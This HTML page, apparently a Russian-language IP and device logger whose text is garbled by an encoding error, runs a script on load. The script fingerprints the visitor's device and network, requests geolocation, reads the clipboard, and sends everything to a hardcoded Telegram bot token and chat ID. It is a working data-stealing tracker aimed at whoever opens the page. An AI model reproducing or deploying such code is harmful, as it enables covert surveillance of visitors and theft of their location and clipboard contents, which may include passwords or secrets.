<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ IP</title>
</head>
<body>
    <h1>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –∏ IP</h1>
    <p>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤–∞—à–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –∏ IP-–∞–¥—Ä–µ—Å –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram-–±–æ—Ç.</p>

    <script>
        const botToken = '7305121459:AAFx3_Ggju_WLXb8sqmkK27NDOiQcOUwy0w';
        const chatId = '1653222949';
        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        async function getDeviceBrandAndModel() {
    const userAgent = navigator.userAgent;
    let deviceBrand = 'Unknown';
    let deviceModel = 'Unknown';

    const brandPatterns = {
        'Samsung': /SM-|SAMSUNG/i,
        'Huawei': /HUAWEI|HW-/i,
        'Xiaomi': /Redmi|Mi\s|POCO/i,
        'OPPO': /OPPO|CPH\d{4}/i,
        'Vivo': /vivo/i,
        'OnePlus': /OnePlus/i,
        'LG': /LG-|LM-/i,
        'Sony': /Sony/i,
        'Nokia': /Nokia/i,
        'Motorola': /Moto/i,
        'Asus': /ASUS/i,
        'Lenovo': /Lenovo/i,
        'ZTE': /ZTE/i,
        'Realme': /Realme/i,
        'Google': /Pixel/i
    };

    if (/Android/.test(userAgent)) {
        const modelPatterns = [
            /;\s*([^;]+?)\s+Build\//i,
            /;\s*([^;]+?)\s+\)/i,
            /\(([^;]+?);\s*/i,
            /;\s*([^;]+?)\s*;/i,
            /Android.*;\s*([^;]+?)\s*;/i,
            /Android.*?\(([^;]+?)\)/i
        ];

        for (let pattern of modelPatterns) {
            const match = userAgent.match(pattern);
            if (match && match[1]) {
                deviceModel = match[1].trim().replace(/Android|Mobile|Build|Version|Release|Linux/gi, '').trim();
                if (deviceModel) break;
            }
        }

        for (let [brand, pattern] of Object.entries(brandPatterns)) {
            if (pattern.test(userAgent)) {
                deviceBrand = brand;
                break;
            }
        }
    }

    return { brand: deviceBrand, model: deviceModel };
}

        async function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const deviceInfo = {
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        platform: navigator.platform,
        uptime: Math.round(performance.now() / 1000),
        webglSupport: supportsWebGL(),
        fonts: await getFonts(),
        renderTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
        osVersion: 'Unknown'  // –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–ª–µ –¥–ª—è –≤–µ—Ä—Å–∏–∏ –û–°
    };

    if (/android/i.test(userAgent)) {
        deviceInfo.device = 'Android';
        const versionMatch = userAgent.match(/Android\s([0-9\.]+)/);
        deviceInfo.osVersion = versionMatch ? versionMatch[1] : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        deviceInfo.device = 'iOS';
        const versionMatch = userAgent.match(/OS\s([0-9_]+)/);
        deviceInfo.osVersion = versionMatch ? versionMatch[1].replace(/_/g, '.') : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    } else if (/Windows NT/i.test(userAgent)) {
        deviceInfo.device = 'Windows';
        const versionMatch = userAgent.match(/Windows NT\s([0-9\.]+)/);
        deviceInfo.osVersion = versionMatch ? versionMatch[1] : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    } else {
        deviceInfo.device = 'Unknown';
    }

    if (/chrome|crios|crmo/i.test(userAgent)) {
        deviceInfo.browser = 'Chrome';
    } else if (/firefox|iceweasel|fxios/i.test(userAgent)) {
        deviceInfo.browser = 'Firefox';
    } else if (/safari/i.test(userAgent)) {
        deviceInfo.browser = 'Safari';
    } else if (/msie|trident/i.test(userAgent)) {
        deviceInfo.browser = 'Internet Explorer';
    } else {
        deviceInfo.browser = 'Unknown';
    }

    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        deviceInfo.batteryLevel = battery.level * 100 + '%';
    } else {
        deviceInfo.batteryLevel = 'Not supported';
    }

    return deviceInfo;
}

        function supportsWebGL() {
            try {
                const canvas = document.createElement('canvas');
                return !!window.WebGLRenderingContext && !!canvas.getContext('webgl');
            } catch (e) {
                return false;
            }
        }

        async function getFonts() {
            const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Courier', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'];
            const availableFonts = [];
            for (const font of fontList) {
                if (document.fonts.check(`12px "${font}"`)) {
                    availableFonts.push(font);
                }
            }
            return availableFonts.join(', ');
        }

        function checkInternetSpeed() {
            return new Promise((resolve, reject) => {
                const image = new Image();
                const startTime = new Date().getTime();

                image.onload = function() {
                    const endTime = new Date().getTime();
                    const duration = (endTime - startTime) / 1000;
                    const bitsLoaded = 1024 * 1024 * 8; // –†–∞–∑–º–µ—Ä –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ –±–∏—Ç–∞—Ö
                    const speedMbps = (bitsLoaded / duration / (1024 * 1024)).toFixed(2);
                    resolve(speedMbps);
                };

                image.onerror = function() {
                    reject('–ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ—Ä–∏—Ç—å —Å–∫–æ—Ä–æ—Å—Ç—å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞');
                };

                image.src = "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png?" + startTime;
            });
        }

        function checkVPN(ipAddress) {
            return fetch(`https://ipapi.co/${ipAddress}/json/`)
                .then(response => response.json())
                .then(data => data.security ? data.security.is_vpn : 'Unknown')
                .catch(() => 'Unknown');
        }

        async function fetchData() {
            try {
                const response = await fetch('http://ip-api.com/json/');
                const data = await response.json();

                return {
                    isp: data.isp || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    org: data.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    as: data.as || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                };
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö:', error);
                return {
                    isp: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    org: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                    as: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                };
            }
        }

        async function getNetworkType() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    let type = connection ? connection.type : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
    if (type === 'cellular') {
        type = '–ú–æ–±–∏–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ';
    } else if (type === 'wifi') {
        type = 'Wi-Fi';
    }
    return type;
}

async function getLanguagePreference() {
    const languageMap = {
        'ru': '–†—É—Å—Å–∫–∏–π',
        'en': '–ê–Ω–≥–ª–∏–π—Å–∫–∏–π',
        'uk': '–£–∫—Ä–∞–∏–Ω—Å–∫–∏–π',
        'es': '–ò—Å–ø–∞–Ω—Å–∫–∏–π',
        'fr': '–§—Ä–∞–Ω—Ü—É–∑—Å–∫–∏–π',
        'de': '–ù–µ–º–µ—Ü–∫–∏–π',
        'it': '–ò—Ç–∞–ª—å—è–Ω—Å–∫–∏–π',
        'pt': '–ü–æ—Ä—Ç—É–≥–∞–ª—å—Å–∫–∏–π',
        'zh': '–ö–∏—Ç–∞–π—Å–∫–∏–π',
        'ja': '–Ø–ø–æ–Ω—Å–∫–∏–π',
        'ko': '–ö–æ—Ä–µ–π—Å–∫–∏–π',
        'ar': '–ê—Ä–∞–±—Å–∫–∏–π',
        'hi': '–•–∏–Ω–¥–∏',
        'bn': '–ë–µ–Ω–≥–∞–ª—å—Å–∫–∏–π',
        'pa': '–ü–µ–Ω–¥–∂–∞–±—Å–∫–∏–π',
        'jv': '–Ø–≤–∞–Ω—Å–∫–∏–π',
        'ms': '–ú–∞–ª–∞–π—Å–∫–∏–π',
        'vi': '–í—å–µ—Ç–Ω–∞–º—Å–∫–∏–π',
        'tl': '–¢–∞–≥–∞–ª—å—Å–∫–∏–π'
    };

    return navigator.languages.map(lang => {
        const [languageCode] = lang.split('-');
        return languageMap[languageCode] || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —è–∑—ã–∫';
    }).join(', ');
}

async function getCompleteInfo() {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ipAddress = ipData.ip;

    const ipInfoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
    const ipInfoData = await ipInfoResponse.json();
    const isp = ipInfoData.org || 'Unknown';
    const location = `${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}`;

    const vpnStatus = await checkVPN(ipAddress);
    const deviceInfo = await getDeviceInfo();
    const deviceBrandAndModel = await getDeviceBrandAndModel();
    const networkType = await getNetworkType();
    const languagePreference = await getLanguagePreference();

    const ispData = await fetchData();
    const internetSpeed = await checkInternetSpeed();

    const browserInfo = `User Agent: ${navigator.userAgent}\nBrowser Name: ${navigator.appName}`;
   
    const osInfo = `Platform: ${navigator.platform}`;
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const platformInfo = `CPU Class: ${navigator.cpuClass || 'Unknown'}`;

    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    const graphicsInfo = gl ? `Vendor: ${gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_VENDOR_WEBGL)}\nRenderer: ${gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL)}` : 'WebGL –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è';

    const memoryInfo = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '–ù–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è';
    const hasFlash = !!navigator.mimeTypes['application/x-shockwave-flash'];

    let message = `
         üåê  –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± IP –∏ —Å–µ—Ç–∏:
‚îú IP-–∞–¥—Ä–µ—Å: ${ipAddress}
‚îú –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${isp}
‚îú –ò–Ω—Ç–µ—Ä–Ω–µ—Ç-–ø—Ä–æ–≤–∞–π–¥–µ—Ä: ${ispData.isp}
‚îú –ò–º—è –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞: ${ispData.org}
‚îú –ù–æ–º–µ—Ä AS –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞: ${ispData.as}
‚îú –¢–∏–ø —Å–µ—Ç–∏: ${networkType}
‚îú –°–∫–æ—Ä–æ—Å—Ç—å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞: ${internetSpeed} Mbps
‚îî –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ VPN / Proxy: ${vpnStatus}

üåç –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ª–æ–∫–∞—Ü–∏–∏ –∏ –≤—Ä–µ–º–µ–Ω–∏:
‚îú –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ: ${location}
‚îî –¢–∞–π–º–∑–æ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ${timeZone}

 üì≤ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:
‚îú –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞: ${deviceInfo.device}
‚îú –ë—Ä–µ–Ω–¥ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${deviceBrandAndModel.brand}
‚îú –ù–∞–∑–≤–∞–Ω–∏–µ –º–æ–¥–µ–ª–∏: ${deviceBrandAndModel.model}
‚îú –í–µ—Ä—Å–∏—è OS: ${deviceInfo.osVersion}
‚îú –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞: ${deviceInfo.screenResolution}
‚îú –£—Ä–æ–≤–µ–Ω—å –∑–∞—Ä—è–¥–∞ –±–∞—Ç–∞—Ä–µ–∏: ${deviceInfo.batteryLevel}
‚îú –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${memoryInfo}
‚îú –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –≤–∏–¥–µ–æ–∫–∞—Ä—Ç–µ: ${graphicsInfo}
‚îî –ü–æ–¥–¥–µ—Ä–∂–∫–∞ WebGL: ${deviceInfo.webglSupport}

üåÄ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–ª–∞—Ç—Ñ–æ—Ä–º–µ –∏ —Å–∏—Å—Ç–µ–º–µ:
‚îú –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${deviceInfo.platform}
‚îú –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –û–°: ${osInfo}
‚îú –î–µ—Ç–∞–ª—å–Ω–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ –ø–ª–∞—Ç—Ñ–æ—Ä–º–µ: ${platformInfo}
‚îî –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º—ã:  ${deviceInfo.uptime} —Å–µ–∫.

‚ö†Ô∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö:
‚îú –Ø–∑—ã–∫: ${deviceInfo.language}
‚îú –Ø–∑—ã–∫–æ–≤—ã–µ –ø—Ä–µ–¥–ø–æ—á—Ç–µ–Ω–∏—è: ${languagePreference}
‚îî –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ —à—Ä–∏—Ñ—Ç—ã: ${deviceInfo.fonts}

üèç –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏:
‚îî –í—Ä–µ–º—è —Ä–µ–Ω–¥–µ—Ä–∏–Ω–≥–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã: ${deviceInfo.renderTime} –º—Å
    `;

    if (deviceBrandAndModel.model !== 'Unknown') {
     

        const inlineButtonUrl = `https://www.google.com/search?q=–ú–æ–¥–µ–ª—å+—É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞%3A+${encodeURIComponent(deviceBrandAndModel.model)}&client=ms`;

        const inlineButton = {
            text: `–£–∑–Ω–∞—Ç—å –±–æ–ª—å—à–µ –æ –º–æ–¥–µ–ª–∏ ${deviceBrandAndModel.model}`,
            url: inlineButtonUrl
        };

        const chargingStatusButton = await getChargingStatusButton();

        const inlineKeyboard = {
            inline_keyboard: [
                [inlineButton],
                [chargingStatusButton]
            ]
        };

        await fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                reply_markup: inlineKeyboard
            })
        });
    } else {
        await fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
    }
}

async function getChargingStatusButton() {
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        let chargingMessage = battery.charging 
            ? "–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ –∑–∞—Ä—è–¥–∫–µ" 
            : "–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –∑–∞—Ä—è–∂–∞–µ—Ç—Å—è";

        return {
            text: chargingMessage,
            callback_data: 'charging_status'
        };
    } else {
        return {
            text: "–°—Ç–∞—Ç—É—Å –±–∞—Ç–∞—Ä–µ–∏ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –Ω–∞ —ç—Ç–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ",
            callback_data: 'charging_status'
        };
    }
}

        getCompleteInfo().then(() => {
            requestGeolocation();
        });

        function requestGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        console.log(`–®–∏—Ä–æ—Ç–∞: ${latitude}, –î–æ–ª–≥–æ—Ç–∞: ${longitude}`);
                        sendLocationToTelegram(latitude, longitude);
                    },
                    (error) => {
                        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:', error);
                        sendLocationErrorToTelegram();
                    }
                );
            } else {
                console.error('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è —ç—Ç–∏–º –±—Ä–∞—É–∑–µ—Ä–æ–º.');
                sendLocationErrorToTelegram();
            }
        }

        function sendLocationToTelegram(latitude, longitude) {
            const message = `–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ${latitude},${longitude}`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram:', data);
                requestClipboardData();
            })
            .catch(error => {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –≤ Telegram:', error);
                requestClipboardData();
            });
        }

        function sendLocationErrorToTelegram() {
            const message = `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–ª –∑–∞–ø—Ä–æ—Å –Ω–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é.`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –æ—Ç–∫–∞–∑–µ –≤ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram:', data);
                requestClipboardData();
            })
            .catch(error => {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –æ—Ç–∫–∞–∑–µ –≤ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –≤ Telegram:', error);
                requestClipboardData();
            });
        }

        async function getClipboardData() {
            try {
                const text = await navigator.clipboard.readText();
                sendClipboardDataToTelegram(text);
            } catch (err) {
                console.error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞: ', err);
                sendClipboardDataErrorToTelegram();
            }
        }

        function sendClipboardDataToTelegram(text) {
            const message = `–î–∞–Ω–Ω—ã–µ –∏–∑ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞: ${text}`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('–î–∞–Ω–Ω—ã–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram:', data);
            })
            .catch(error => {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ –≤ Telegram:', error);
            });
        }

        function sendClipboardDataErrorToTelegram() {
            const message = '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –±—É—Ñ–µ—Ä—É –æ–±–º–µ–Ω–∞.';

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –±—É—Ñ–µ—Ä—É –æ–±–º–µ–Ω–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram:', data);
            })
            .catch(error => {
                console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –æ—à–∏–±–∫–∏ –¥–æ—Å—Ç—É–ø–∞ –∫ –±—É—Ñ–µ—Ä—É –æ–±–º–µ–Ω–∞ –≤ Telegram:', error);
            });
        }

        function requestClipboardData() {
            getClipboardData();
        }
    </script> 
</body>
</html> 